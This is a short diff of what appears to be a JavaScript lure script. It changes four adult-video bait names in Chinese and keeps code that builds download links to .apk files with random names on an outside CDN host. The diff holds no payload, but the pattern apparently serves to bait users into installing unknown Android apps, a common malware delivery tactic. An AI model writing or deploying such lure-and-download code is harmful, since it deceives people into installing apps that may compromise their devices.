@@ -1,7 +1,7 @@
-var name="夜色A片";
-var name2="360影视A片";
-var name3="PPTV聚色A片";
-var name4="极品视频";
+var name="无码高清";
+var name2="无码高清";
+var name3="无码高清";
+var name4="无码高清";
 var url="http://cdn3.jinhuashenghuo.com/a71-" + randomString(10) + ".apk";
 var url2="http://cdn3.jinhuashenghuo.com/a71-" + randomString(10) + ".apk";
 var url3="http://cdn3.jinhuashenghuo.com/a71-" + randomString(10) + ".apk";
